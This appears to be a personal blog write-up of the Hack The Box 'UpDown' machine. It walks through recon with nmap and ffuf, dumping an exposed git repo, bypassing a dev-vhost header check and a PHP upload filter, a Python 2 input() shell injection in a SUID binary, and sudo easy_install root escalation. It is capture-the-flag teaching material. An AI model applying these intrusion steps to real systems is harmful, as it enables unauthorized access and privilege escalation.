---
layout: post
author: H4-L0
---

# HTB-updown

![image](/images/Pasted image 20221103202135.png)

## Enumeration

### nmap

we started with nmap that revealed just 2 open ports

```shell
$ sudo nmap -sV -p- updown
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 15:28 EDT
Nmap scan report for updown (10.10.11.177)
Host is up (0.046s latency).
rDNS record for 10.10.11.177: updown.htb
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `22` - `ssh`
- `80` - `http apache`

we looking at the website that offered an input to check an URL, but mostly just responded with `seems to be down`

![image](/images/Pasted image 20221103202748.png)

other inputs are registered as `hacker attempt`

![image](/images/Pasted image 20221103202309.png)

### dirbusting

as a next step we searched for directories.

```shell
$ ffuf -w `fzf-wordlist` -u http://updown.htb/FUZZ
...
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 546ms]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3560ms]
dev                     [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 35ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3780ms]
                        [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 4571ms]
index.php               [Status: 200, Size: 1131, Words: 186, Lines: 40, Duration: 39ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 35ms]
```

> `dev` seems to be very interesting
> {: .prompt-info }

as `dev` was empty we looked one directory further an got another hit.

```shell
$ ffuf -w `fzf-wordlist` -u http://updown.htb/dev/FUZZ

.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 36ms]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 37ms]
.git/HEAD               [Status: 200, Size: 21, Words: 2, Lines: 2, Duration: 1003ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2006ms]
                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4018ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
```

> we got a git repo on `http://updown.htb/dev/.git`
> {: .prompt-info }

![image](/images/Pasted image 20221103204006.png)

to dump the directory from the server we used [**git-dumper**](https://github.com/arthaud/git-dumper)

```shell
$ python3 git-dumper.py http://updown.htb/dev/.git updown
```

this is the output we got from git-dumper

```shell
$ ls -la
total 40
drwxr-xr-x 3 j0j0pupp3 j0j0pupp3 4096 Nov  2 15:43 .
drwxr-xr-x 5 j0j0pupp3 j0j0pupp3 4096 Nov  2 15:43 ..
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3   59 Nov  2 15:43 admin.php
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3  147 Nov  2 15:43 changelog.txt
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3 3145 Nov  2 15:43 checker.php
drwxr-xr-x 7 j0j0pupp3 j0j0pupp3 4096 Nov  2 15:43 .git
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3  117 Nov  2 15:43 .htaccess
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3  273 Nov  2 15:43 index.php
-rw-r--r-- 1 j0j0pupp3 j0j0pupp3 5531 Nov  2 15:43 stylesheet.css
```

this seems to be the repo of the website we saw earlier. and `checker.php` is the page where our input gets verified.

```php
...
if($_POST['check']){

        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
...
```

it looks like the form also expects a file upload. And there are a couple of tests in place to prevent malicious behavior, starting with checking the size of the file.

```php
...
$file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }

        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
...
```

after that it checks for file extensions and creates an upload path with a md5-string named directory.

```shell
...
 # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
...
```

and finally it gets uploaded.
so there might be a chance to upload a file to get a reverse shell.

> unfortunately we could not find where the uploads are located
> {: .prompt-warning }

![image](/images/Pasted image 20221103205801.png)

so the search goes on.

after looking through the commits of the git-repo we found something.

```shell
$ git log -p
```

```shell
commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 3190432..44ff240 100644
--- a/.htaccess
+++ b/.htaccess
@@ -1,5 +1,4 @@
-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
...
```

this commit speaks of a possible `vhost` that we might find under a `dev` subdomain.
`-AuthUserFile /var/www/dev/.htpasswd`

```shell
...
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
```

and it is protected by a special header `Special-Dev: only4dev`.

In the next step we are spinning up **burp** to intercept the request to change the header.

![image](/images/Pasted image 20221103211708.png)

after trying different URLs we got in with `http://dev.siteisup.htb` and setting the special header `Special-Dev: only4dev`

![image](/images/Pasted image 20221103211846.png)

clicking on Admin Panel got us nothing

![image](/images/Pasted image 20221103211944.png)

but now we can access the **uploads** directory.

![image](/images/Pasted image 20221103212113.png)

## reverse shell

file uploads seems to work, but we need to bypass the filters.

![image](/images/Pasted image 20221103212252.png)

trying out a few other extension got us an `php` upload with `phar`

![image](/images/Pasted image 20221103212459.png)

![image](/images/Pasted image 20221103212824.png)

the directory got created as we saw in the source code.

![image](/images/Pasted image 20221103212553.png)

but the directory is empty. :(

![image](/images/Pasted image 20221103212608.png)

we found out, that the file gets deleted as soon as the checks are through. so we needed a method that the verification of our input takes longer.

```shell
...
       }

  # Delete the uploaded file.
        @unlink($final_path);
}
...
```

in the end we just needed to add a random string in a line above our code, and the server tries to search for this "URL". this takes long enough to access our malicious code.

![image](/images/Pasted image 20221103213308.png)

> we got code execution!
> {: .prompt-info }

![image](/images/Pasted image 20221103213210.png)

next we check which functions are disabled on the server.

![image](/images/Pasted image 20221103213405.png)

unfortunately quite a lot. but we got one we could use.

![image](/images/Pasted image 20221103213617.png)

we started crafting our payload and until we got **RCE**.

![image](/images/Pasted image 20221103215157.png)

![image](/images/Pasted image 20221103215216.png)

and then we popped a shell with:

![image](/images/Pasted image 20221103215545.png)

![image](/images/Pasted image 20221103215603.png)

## Privilege Escalation

after stabilizing the shell we looked for escalating our privileges.
we found the `developer` home directory and the user flag. but we had no permissions yet to read it.

```shell
www-data@updown:/home$ ls
developer
www-data@updown:/home$ cd developer/
www-data@updown:/home/developer$ ls
dev  user.txt
www-data@updown:/home/developer$ cat user.txt
cat: user.txt: Permission denied
```

but there was another directory `dev` and this looked promising.
the binary inside the directory had the `suid` bin set. so if we could spawn a shell from it we could escalate to `developer`.

```shell
www-data@updown:/home/developer$ cd dev/
www-data@updown:/home/developer/dev$ ls
siteisup  siteisup_test.py
www-data@updown:/home/developer/dev$ ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
```

if we execute the binary it wants an input for an URL. but every time it throws an error.

```shell
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:google.de
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1, in <module>
NameError: name 'google' is not defined
```

the error is helpful in a way, that we know the binary is executing the python script from inside. we could this confirm when we executed `strings` on the binary.

```shell
...
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
...
```

ok, the source of the python script looks like this.

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

very short script. after trying a few things we thought that the only thing we control is the input method. so after some research we found a vulnerability in python 2.

the binary executes python 2 too.

```shell
www-data@updown:/home/developer/dev$ /usr/bin/python --version
Python 2.7.18
```

the exploit looks like this.

```shell
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__("os").system("/bin/sh")
$ whoami
developer
```

the user flag was still not readable. but we had now access to the `.ssh` directory where we found a private key.
after copying the key, changing the the permissions and using it to log back in we could finally read the first flag.

![image](/images/Pasted image 20221103221723.png)

## Root

now we needed to get root. checking `sudo -l` revealed that we could execute `easy_install` as root.
looking up `easy_install` on [**gtfobins**](https://gtfobins.github.io/) we got our attack vector.

![image](/images/Pasted image 20221103221945.png)

![image](/images/Pasted image 20221103221959.png)

just copying the commands got us the `root` shell and the root flag.

![image](/images/Pasted image 20221103222123.png)

\[H4\]-\[L0\]
